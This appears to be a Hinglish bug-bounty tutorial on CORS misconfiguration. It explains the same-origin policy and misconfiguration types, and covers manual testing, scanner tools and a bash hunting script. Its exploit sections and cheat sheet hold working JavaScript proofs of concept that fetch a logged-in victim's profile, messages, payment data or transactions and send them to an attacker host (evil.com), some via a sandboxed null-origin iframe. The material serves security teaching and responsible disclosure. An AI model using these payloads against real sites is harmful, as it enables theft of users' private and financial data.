# :globe_with_meridians: CORS Misconfiguration Cross-Origin Resource Sharing: Wrong Settings Se User Data Steal Karo! (Hinglish Mein)

> **Original Source:** [CORS Misconfiguration Cross-Origin Resource Sharing: Wrong Settings Se User Data Steal Karo! (Hinglish Mein)](https://infosecwriteups.com/cors-misconfiguration-cross-origin-resource-sharing-wrong-settings-se-user-data-steal-karo-ea1eb50ee132)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# CORS Misconfiguration Cross-Origin Resource Sharing: Wrong Settings Se User Data Steal Karo! (Hinglish Mein)


Series: Bug Bounty Zero se Hero 🦸 | Article #18
*By HackerMD | 17 min read*

## Aaj Kya Seekhenge?


- CORS kya hai bilkul basics se

- Same-Origin Policy kyun exist karti hai

- CORS misconfiguration types sabhi

- Manual testing step by step

- Automated testing tools

- Real exploit data steal PoC

- Impact maximize karna bounty badhao

>

Kyun zaroori hai? CORS misconfiguration ek silent killer hai dikhta nahi, lekin attacker tumhare logged-in session se silently API calls karke data steal kar sakta hai! Banks, fintech apps, health apps sab affected ho sakte hain! Bounty: $500 se $5,000+


## CORS Kya Hai? Pehle Same-Origin Policy Samjho


## Same-Origin Policy (SOP):


Browser ka ek security rule hai:


```
Evil.com pe ek page hai
→ Woh JavaScript se bank.com/api/balance nahi read kar sakta!
→ Browser block karta hai!
→ Yeh hai Same-Origin Policy!

"Same Origin" matlab:
Protocol + Domain + Port — teeno same hone chahiye!

https://bank.com:443/api ✅ Same origin
http://bank.com:443/api ❌ Different protocol
https://evil.com:443/api ❌ Different domain
https://bank.com:8080/api ❌ Different port
```


## CORS Kya Karta Hai?


```
Lekin legitimate use cases hain:
→ frontend.app.com → api.app.com se data chahiye!
→ SOP block karega!

CORS = Browser ko batao ki
"In specific origins ko allow karo!"

Server response header:
Access-Control-Allow-Origin: https://frontend.app.com
→ Ab browser allow karta hai!
```


## Misconfiguration Kab Hoti Hai?


```
Developer ne galti se:
Access-Control-Allow-Origin: *
Ya:
Access-Control-Allow-Origin: [ATTACKER INPUT]
→ Koi bhi origin se data read ho sakta hai!

Yahi hai CORS Misconfiguration! 😱
```


## PART 2: CORS Misconfiguration Types


## Type 1: Wildcard Origin Sabse Basic


```
Request:
GET /api/userdata HTTP/1.1
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true ← PROBLEM!

Wildcard (*) + Credentials = Dangerous combo!
(Actually browsers credentials allow nahi karte with *
lekin kuch implementations mein bypass possible!)
```


## Type 2: Origin Reflection Sabse Common Bug!


```
Request:
GET /api/profile HTTP/1.1
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com ← REFLECTED!
Access-Control-Allow-Credentials: true

Server ne blindly Origin header reflect kar diya!
Koi validation nahi!
→ Koi bhi origin se data steal! 🔴
```


## Type 3: Null Origin Bypass


```
Request:
GET /api/data HTTP/1.1
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

null origin allow karta hai?
→ Sandbox iframe se exploit ho sakta hai!

Exploit:
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
src="data:text/html,
<script>
fetch('https://target.com/api/data', {credentials:'include'})
.then(r=>r.text())
.then(d=>location='https://evil.com/?data='+btoa(d))
</script>">
</iframe>
```


## Type 4: Subdomain Wildcard Misconfiguration


```
# Server check karta hai:
# "origin mein target.com hai?"
# Agar haan → Allow!

Request:
Origin: https://evil-target.com

Response:
Access-Control-Allow-Origin: https://evil-target.com ✅
→ Bypass! "target.com" string match hua!

Ya:
Origin: https://target.com.evil.com
→ Ends with "target.com" check bypass!
```


## Type 5: HTTP → HTTPS Trust


```
# Secure site HTTP origins trust kare:
Origin: http://target.com (HTTP!)

Response:
Access-Control-Allow-Origin: http://target.com ✅
Access-Control-Allow-Credentials: true

HTTP = Man-in-the-middle possible!
HTTPS site HTTP trust kare = Security issue!
```


## Type 6: Special Characters Bypass


```
# Kuch implementations mein:
Origin: https://target.com_.evil.com
Origin: https://target.com!.evil.com
Origin: https://target.com$.evil.com

→ Agar server regex properly implement nahi kiya
toh bypass possible!
```


## PART 3: Manual Testing Step by Step


## Step 1: Burp Suite Se Origin Header Add Karo


```
# Normal request:
GET /api/user/profile HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION

# Modified request — Origin add karo:
GET /api/user/profile HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Origin: https://evil.com

# Response check karo:
Access-Control-Allow-Origin: https://evil.com ← Reflected!
Access-Control-Allow-Credentials: true ← Credentials!
→ CORS Misconfiguration! 🎯
```


## Step 2: Different Origins Test Karo


```
# Test origins list:
https://evil.com
https://evilttarget.com
https://target.com.evil.com
https://evil-target.com
null
http://target.com (HTTP)
https://subdomain.target.com
https://notarget.com
```


## Step 3: Credentials Check Karo


```
# Sirf ACAO header enough nahi hai!
# ACAC header bhi chahiye exploit ke liye:

Exploitable:
Access-Control-Allow-Origin: https://evil.com ✅
Access-Control-Allow-Credentials: true ✅

Not Exploitable (cookies nahi milenge):
Access-Control-Allow-Origin: * ✅
Access-Control-Allow-Credentials: (missing/false) ❌
```


## Step 4: Pre-flight Request Test


```
# Complex requests ke liye browser OPTIONS bhejta hai:
OPTIONS /api/data HTTP/1.1
Host: target.com
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type

# Response check karo:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: GET,POST,PUT,DELETE
Access-Control-Allow-Headers: Content-Type,Authorization
Access-Control-Allow-Credentials: true
→ Pre-flight bhi bypass! 🔴
```


## PART 4: Real Exploit Data Steal PoC


## Basic CORS Exploit:


```
<!-- evil.com/exploit.html -->
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
// Target ki API se data steal karo
fetch('https://target.com/api/user/profile', {
credentials: 'include' // Victim ke cookies bhejta hai!
})
.then(response => response.json())
.then(data => {
// Data attacker ke server pe bhejo
fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(data)));
document.body.innerHTML = "Page loaded!";
})
.catch(err => console.log(err));
</script>
</body>
</html>
```


## Advanced Exploit Full Account Data Steal:


```
<!-- evil.com/advanced_exploit.html -->
<!DOCTYPE html>
<html>
<body>
<script>
async function stealData() {
try {
// Step 1: Profile data
const profile = await fetch(
'https://target.com/api/user/profile',
{credentials: 'include'}
).then(r => r.json());

// Step 2: Private messages
const messages = await fetch(
'https://target.com/api/messages',
{credentials: 'include'}
).then(r => r.json());

// Step 3: Payment info
const payments = await fetch(
'https://target.com/api/payment-methods',
{credentials: 'include'}
).then(r => r.json());

// Step 4: Sab data ek saath exfiltrate karo
const allData = {
profile: profile,
messages: messages,
payments: payments,
timestamp: new Date().toISOString()
};

// Attacker ke server pe bhejo
navigator.sendBeacon(
'https://evil.com/collect',
JSON.stringify(allData)
);

} catch(e) {
// Silent fail
}
}

stealData();
</script>
</body>
</html>
```


## Null Origin Exploit:


```
<!-- Sandbox iframe trick -->
<iframe
sandbox="allow-scripts allow-top-navigation allow-forms"
src='data:text/html,
<script>
var req = new XMLHttpRequest();
req.onload = function() {
location = "https://evil.com/steal?data=" + btoa(this.responseText);
};
req.open("get", "https://target.com/api/sensitive", true);
req.withCredentials = true;
req.send();
</script>'>
</iframe>
```


## PART 5: Automated Testing Tools


## Tool 1: CORScanner


```
# Install karo
pip3 install corscanner

# Single target
corscanner -u https://target.com

# File se multiple targets
corscanner -i targets.txt

# Verbose output
corscanner -u https://target.com -v
```


## Tool 2: Nuclei CORS Templates


```
# Nuclei se automated check
nuclei -l targets.txt \
-t ~/nuclei-templates/misconfiguration/cors/ \
-o cors_found.txt

# Tags se
nuclei -l targets.txt \
-tags cors \
-o cors_results.txt
```


## Tool 3: Burp Suite Passive Scan


```
1. Burp Suite Pro → Scanner
2. "Issues" mein CORS issues automatically flag hota hai
3. Manual verification karo
```


## Tool 4: Custom Python Script


```
#!/usr/bin/env python3
# cors_check.py

import requests
import sys

def check_cors(url, origins):
print(f"\n🔍 Testing: {url}")
print("─" * 50)

for origin in origins:
try:
headers = {
"Origin": origin,
"Cookie": "session=YOUR_SESSION_HERE"
}
r = requests.get(url, headers=headers,
timeout=10, verify=False)

acao = r.headers.get("Access-Control-Allow-Origin", "")
acac = r.headers.get("Access-Control-Allow-Credentials", "")

if acao and (acao == origin or acao == "*"):
if acac.lower() == "true":
print(f"🔴 VULNERABLE! Origin: {origin}")
print(f" ACAO: {acao}")
print(f" ACAC: {acac}")
else:
print(f"🟡 Partial: {origin} (no credentials)")
else:
print(f"✅ Safe: {origin}")
except Exception as e:
print(f"❌ Error: {e}")

# Test origins
ORIGINS = [
"https://evil.com",
"null",
"https://TARGET.com.evil.com",
"https://evil-TARGET.com",
"http://TARGET.com",
]

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 \
else "https://target.com/api/user"

check_cors(TARGET_URL, ORIGINS)
```


## PART 6: Elite CORS Hunting Workflow


```
#!/bin/bash
# cors_hunt.sh

TARGET=$1
DIR="cors_${TARGET}"
mkdir -p $DIR

echo "🔀 CORS Hunt: $TARGET"
echo "═══════════════════════"

# Step 1: API endpoints dhundho
echo "📡 Finding API endpoints..."
gau $TARGET | grep -iE "/api/|/v1/|/v2/" | \
grep -v "\.js\|\.css\|\.png" | \
uro > $DIR/api_endpoints.txt
echo "✅ APIs: $(wc -l < $DIR/api_endpoints.txt)"

# Step 2: Live endpoints
cat $DIR/api_endpoints.txt | \
httpx -silent -mc 200 > $DIR/live_apis.txt
echo "✅ Live: $(wc -l < $DIR/live_apis.txt)"

# Step 3: CORS check karo
echo "🔍 Checking CORS..."
while read url; do
response=$(curl -s -I \
-H "Origin: https://evil.com" \
-H "Cookie: test=test" \
"$url" 2>/dev/null)

acao=$(echo "$response" | \
grep -i "access-control-allow-origin" | \
head -1)
acac=$(echo "$response" | \
grep -i "access-control-allow-credentials" | \
head -1)

if echo "$acao" | grep -qi "evil.com"; then
if echo "$acac" | grep -qi "true"; then
echo "🔴 CRITICAL CORS: $url" \
>> $DIR/cors_vulnerable.txt
echo " $acao" >> $DIR/cors_vulnerable.txt
echo " $acac" >> $DIR/cors_vulnerable.txt
else
echo "🟡 CORS (no creds): $url" \
>> $DIR/cors_partial.txt
fi
fi
done < $DIR/live_apis.txt

# Step 4: Nuclei scan
nuclei -l $DIR/live_apis.txt \
-tags cors \
-silent \
-o $DIR/nuclei_cors.txt 2>/dev/null

echo "═══════════════════════"
echo "📊 CORS Hunt Results:"
echo "API Endpoints : $(wc -l < $DIR/api_endpoints.txt)"
echo "Live APIs : $(wc -l < $DIR/live_apis.txt)"
echo "CORS Vulnerable: $(cat $DIR/cors_vulnerable.txt \
2>/dev/null | grep "CRITICAL" | wc -l)"
echo "Results in : $DIR/"
```


## CORS Cheat Sheet Quick Reference


```
# ─── DETECTION HEADERS ───────────────────
Origin: https://evil.com
Origin: null
Origin: https://TARGET.com.evil.com

# ─── VULNERABLE RESPONSE ─────────────────
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
→ EXPLOITABLE! 🔴

# ─── SAFE RESPONSES ──────────────────────
Access-Control-Allow-Origin: https://trusted.com
→ Specific whitelist ✅

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
→ No cookies = Limited impact ✅

# ─── EXPLOIT TEMPLATE ────────────────────
fetch('https://target.com/api/data', {
credentials: 'include'
}).then(r=>r.json()).then(d=>
fetch('https://evil.com/?d='+btoa(JSON.stringify(d)))
);

# ─── TOOLS ───────────────────────────────
corscanner -u URL → Automated scan
nuclei -tags cors → Template scan
Burp Suite + Origin header → Manual test
```


## Impact Levels Bounty Guide


```
🟢 Low Impact ($100-300):
→ ACAO: * (wildcard)
→ ACAC: false/missing
→ Non-sensitive endpoints

🟡 Medium Impact ($300-800):
→ Origin reflection
→ ACAC: true
→ Public data endpoints

🟠 High Impact ($800-3000):
→ Origin reflection
→ ACAC: true
→ Private/sensitive data
→ Profile, messages, etc.

🔴 Critical Impact ($3000-8000+):
→ Origin reflection
→ ACAC: true
→ Financial data
→ Account takeover possible
→ PII mass exposure
```


## Aaj Ka Homework


```
# 1. CORScanner install karo:
pip3 install corscanner

# 2. Test karo (legal target):
corscanner -u https://httpbin.org -v

# 3. Manual test:
curl -I -H "Origin: https://evil.com" \
https://httpbin.org/get

# 4. Burp Suite mein:
# Kisi bhi API request pe Origin: https://evil.com add karo
# Response headers check karo
# ACAO + ACAC dono mile? = Vulnerable!

# 5. CORS exploit HTML file banao:
# Apna PoC file locally test karo
# DVWA mein CORS test karo

# Comment mein batao:
# Pehli CORS misconfiguration kahan dhundhi?
```


## Quick Revision


```
🔀 CORS = Cross-Origin Resource Sharing
🛡️ SOP = Browser ka security rule
Different origins block karta hai
❌ Misconfiguration = Origin blindly reflect karna
🔑 Exploitable = ACAO: attacker origin
+ ACAC: true → BOTH chahiye!
💥 Types = Reflection, Wildcard, Null,
Subdomain confusion, HTTP trust
🤖 Tools = CORScanner, Nuclei, Burp Suite
💰 Max Impact = Sensitive API + credentials = High!
```


## Meri Baat…


Ek fintech app pe maine `/api/v2/transactions` endpoint pe test kiya:


```
curl -I \
-H "Origin: https://evil.com" \
-H "Cookie: session=MY_SESSION" \
https://target-fintech.com/api/v2/transactions
```


Response:


```
HTTP/2 200
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json
```


Maine exploit banaya:


```
fetch('https://target-fintech.com/api/v2/transactions', {
credentials: 'include'
}).then(r => r.json()).then(data => {
// Transaction history + account balance!
fetch('https://evil.com/steal?d=' + btoa(JSON.stringify(data)));
});
```


Victim ka poora transaction history agar woh mera malicious page visit kare!


## Get Hacker MD’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Company ko report kiya:


Bounty: $2,500 High! 🎉


Lesson: CORS sirf ek header change hai lekin impact bahut bada ho sakta hai! Har API endpoint pe test karo!*HackerMD Bug Bounty Hunter | Cybersecurity ResearcherGitHub: *[BotGJ16](https://github.com/BotGJ16)* | Medium: *[@HackerMD](https://medium.com/@HackerMD)


*Previous: *[Article #17 SSRF](https://medium.com/@HackerMD)
*Next: Article #19 CSRF: Cross-Site Request Forgery#CORS #CORSMisconfiguration #BugBounty #WebSecurity #EthicalHacking #Hinglish #OWASP #HackerMD*

---

*Originally published on [Medium](https://infosecwriteups.com/cors-misconfiguration-cross-origin-resource-sharing-wrong-settings-se-user-data-steal-karo-ea1eb50ee132). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
